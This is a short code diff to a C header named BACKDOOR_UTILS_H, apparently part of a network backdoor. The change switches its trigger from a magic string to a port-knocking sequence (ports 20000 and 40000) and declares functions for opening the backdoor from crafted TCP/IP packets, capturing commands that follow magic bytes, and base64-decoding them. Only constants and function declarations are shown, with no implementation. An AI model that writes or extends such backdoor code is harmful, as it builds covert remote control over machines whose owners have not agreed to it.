@@ -1,8 +1,8 @@
 #ifndef BACKDOOR_UTILS_H
 #define BACKDOOR_UTILS_H
 
-// #define PORT_KNOCK_LIST // used to determine how to open backdoor
-#define MAGIC_PORT_STRING
+#define PORT_KNOCK_LIST // used to determine how to open backdoor
+// #define MAGIC_PORT_STRING
 
 #define CDR_NOISE_COMMAND "noi"
 #define CDR_PORTS { 20000,40000,00 }
@@ -15,6 +15,7 @@
 #define MAGIC_PORT 40000
 #define MAGIC_STRING "thisisatest"
 #define MAGIC_STRING_LEN 11
+
 
 #define DEBUG
 
@@ -32,5 +33,9 @@ void open_backdoor_via_magic_bytes(struct tcphdr *tcp, struct iphdr *ip);
 char *set_port_knock_list_filter(unsigned int cports[], int cportcnt);
 
 char *set_magic_string_filter();
+
+void capture_command_after_magic_bytes(unsigned char *data);
+
+unsigned char *base64_decode(unsigned char *input, int *out_len);
 
 #endif
